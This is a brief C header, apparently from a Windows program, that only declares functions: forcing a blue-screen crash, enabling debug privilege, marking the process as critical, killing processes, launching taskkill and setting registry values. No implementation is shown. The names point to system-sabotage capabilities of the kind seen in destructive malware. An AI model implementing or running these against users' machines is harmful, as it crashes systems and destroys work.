#pragma once
#include "MM3.h"

BOOL NTAPI BSOD(DWORD error_code);
BOOL NTAPI EnterDebugMode(VOID);
BOOL NTAPI SetProcessCritical(VOID);
VOID NTAPI KillProcessByID(DWORD pid);
VOID NTAPI LaunchTaskkill(VOID);
VOID NTAPI SetRegistryDword(HKEY hKeyRoot, CONST CHAR* subKey, CONST CHAR* valueName, DWORD valueData);
VOID NTAPI SetRegistryString(HKEY hKeyRoot, CONST CHAR* subKey, CONST CHAR* valueName, CONST CHAR* valueData);